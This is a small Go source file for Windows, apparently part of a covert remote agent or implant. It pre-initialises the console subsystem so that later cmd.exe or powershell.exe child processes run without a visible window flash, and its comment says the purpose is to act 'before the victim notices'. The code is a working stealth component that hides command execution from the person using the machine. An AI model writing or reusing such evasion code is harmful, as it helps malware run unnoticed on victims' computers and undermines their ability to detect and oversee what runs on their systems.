//go:build windows

package main

import "golang.org/x/sys/windows"

// preinitConsole eliminates the one-time console-window flash that occurs when
// a Windows GUI-subsystem process (-H windowsgui) spawns its very first child
// process.
//
// Why this happens:
//   A GUI process has no console attached. When it creates its first child
//   process (e.g. cmd.exe or powershell.exe), Windows initialises the console
//   I/O subsystem for the parent process on-the-fly. That one-time setup
//   briefly allocates — and then may flash — a console window, even if
//   CREATE_NO_WINDOW is set for the child.
//
// Fix:
//   Call AllocConsole + FreeConsole at agent startup before any subprocess is
//   spawned. This forces the one-time initialisation to happen immediately
//   (before the victim notices) and in a context where no process is visible.
//   All subsequent child processes reuse the already-initialised subsystem and
//   never flash.
func preinitConsole() {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	alloc := kernel32.NewProc("AllocConsole")
	free := kernel32.NewProc("FreeConsole")
	alloc.Call()
	free.Call()
}
